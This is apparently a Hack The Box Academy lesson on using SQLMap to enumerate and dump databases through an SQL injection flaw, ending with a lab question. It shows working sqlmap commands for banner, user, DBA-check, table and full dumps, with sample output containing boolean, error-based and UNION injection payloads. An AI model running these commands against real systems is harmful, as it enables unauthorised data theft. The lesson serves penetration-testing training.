
<h1>Database Enumeration</h1>
<hr/>
<p>Enumeration represents the central part of an SQL injection attack, which is done right after the successful detection and confirmation of exploitability of the targeted SQLi vulnerability. It consists of lookup and retrieval (i.e., exfiltration) of all the available information from the vulnerable database.</p>
<hr/>
<h2>SQLMap Data Exfiltration</h2>
<p>For such purpose, SQLMap has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content. For example, the excerpts from <a href="https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml">queries.xml</a> for a MySQL DBMS can be seen below:</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;root&gt;
    &lt;dbms value="MySQL"&gt;
        &lt;!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html --&gt;
        &lt;cast query="CAST(%s AS NCHAR)"/&gt;
        &lt;length query="CHAR_LENGTH(%s)"/&gt;
        &lt;isnull query="IFNULL(%s,' ')"/&gt;
...SNIP...
        &lt;banner query="VERSION()"/&gt;
        &lt;current_user query="CURRENT_USER()"/&gt;
        &lt;current_db query="DATABASE()"/&gt;
        &lt;hostname query="@@HOSTNAME"/&gt;
        &lt;table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/&gt;
        &lt;column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/&gt;
        &lt;is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/&gt;
        &lt;check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/&gt;
        &lt;users&gt;
            &lt;inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/&gt;
            &lt;blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/&gt;
        &lt;/users&gt;
    ...SNIP...
</code></pre>
<p>For example, if a user wants to retrieve the "banner" (switch <code>--banner</code>) for the target based on MySQL DBMS, the <code>VERSION()</code> query will be used for such purpose.<br/>
In case of retrieval of the current user name (switch <code>--current-user</code>), the <code>CURRENT_USER()</code> query will be used.</p>
<p>Another example is retrieving all the usernames (i.e., tag <code>&lt;users&gt;</code>). There are two queries used, depending on the situation. The query marked as <code>inband</code> is used in all non-blind situations (i.e., UNION-query and error-based SQLi), where the query results can be expected inside the response itself. The query marked as <code>blind</code>, on the other hand, is used for all blind situations, where data has to be retrieved row-by-row, column-by-column, and bit-by-bit.</p>
<hr/>
<h2>Basic DB Data Enumeration</h2>
<p>Usually, after a successful detection of an SQLi vulnerability, we can begin the enumeration of basic details from the database, such as the hostname of the vulnerable target (<code>--hostname</code>), current user's name (<code>--current-user</code>), current database name (<code>--current-db</code>), or password hashes (<code>--passwords</code>). SQLMap will skip SQLi detection if it has been identified earlier and directly start the DBMS enumeration process.</p>
<p>Enumeration usually starts with the retrieval of the basic information:</p>
<ul>
<li>Database version banner (switch <code>--banner</code>)</li>
<li>Current user name (switch <code>--current-user</code>)</li>
<li>Current database name (switch <code>--current-db</code>)</li>
<li>Checking if the current user has DBA (administrator) rights (switch <code>--is-dba</code>)</li>
</ul>
<p>The following SQLMap command does all of the above:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 13:30:57 /2020-09-17/

[13:30:57] [INFO] resuming back-end DBMS 'mysql' 
[13:30:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5134=5134

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
---
[13:30:57] [INFO] the back-end DBMS is MySQL
[13:30:57] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL &gt;= 5.0
banner: '5.1.41-3~bpo50+1'
[13:30:58] [INFO] fetching current user
current user: 'root@%'
[13:30:58] [INFO] fetching current database
current database: 'testdb'
[13:30:58] [INFO] testing if current user is DBA
[13:30:58] [INFO] fetching current user
current user is DBA: True
[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 13:30:58 /2020-09-17/
</code></pre>
<p>From the above example, we can see that the database version is quite old (MySQL 5.1.41 - from November 2009), and the current user name is <code>root</code>, while the current database name is <code>testdb</code>.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0">Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.</p>
</div>
</div>
<hr/>
<h2>Table Enumeration</h2>
<!-- There are two ways to retrieve the names of databases, tables, and columns. -->
<p>In most common scenarios, after finding the current database name (i.e. <code>testdb</code>), the retrieval of table names would be by using the <code>--tables</code> option and specifying the DB name with <code>-D testdb</code>, is as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

...SNIP...
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
</code></pre>
<p>After spotting the table name of interest, retrieval of its content can be done by using the <code>--dump</code> option and specifying the table name with <code>-T users</code>, as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

...SNIP...
Database: testdb

Table: users
[4 entries]
+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+

[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
</code></pre>
<p>The console output shows that the table is dumped in formatted CSV format to a local file, <code>users.csv</code>.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0">Tip: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.</p>
</div>
</div>
<p><img alt="Database table showing columns for data type, table name, column name, and privileges with sample entries." src="https://academy.hackthebox.com/storage/modules/58/pVBXxRz.png"/></p>
<hr/>
<h2>Table/Row Enumeration</h2>
<p>When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only <code>name</code> and <code>surname</code> columns) with the <code>-C</code> option, as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

...SNIP...
Database: testdb

Table: users
[4 entries]
+--------+------------+
| name   | surname    |
+--------+------------+
| luther | blisset    |
| fluffy | bunny      |
| wu     | ming       |
| NULL   | nameisnull |
+--------+------------+
</code></pre>
<p>To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the <code>--start</code> and <code>--stop</code> options (e.g., start from 2nd up to 3rd entry), as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

...SNIP...
Database: testdb

Table: users
[2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+
</code></pre>
<hr/>
<h2>Conditional Enumeration</h2>
<p>If there is a requirement to retrieve certain rows based on a known <code>WHERE</code> condition (e.g. <code>name LIKE 'f%'</code>), we can use the option <code>--where</code>, as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

...SNIP...
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+
</code></pre>
<hr/>
<h2>Full DB Enumeration</h2>
<p>Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option <code>-T</code> altogether (e.g. <code>--dump -D testdb</code>). By simply using the switch <code>--dump</code> without specifying a table with <code>-T</code>, all of the current database content will be retrieved. As for the <code>--dump-all</code> switch, all the content from all the databases will be retrieved.</p>
<p>In such cases, a user is also advised to include the switch <code>--exclude-sysdbs</code> (e.g. <code>--dump-all --exclude-sysdbs</code>), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.</p>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="290"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> What's the contents of table flag1 in the testdb database? (Case #1)
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer290" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-290">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="290" id="btnAnswer290">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint290" data-toggle="modal" id="hintBtn290"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
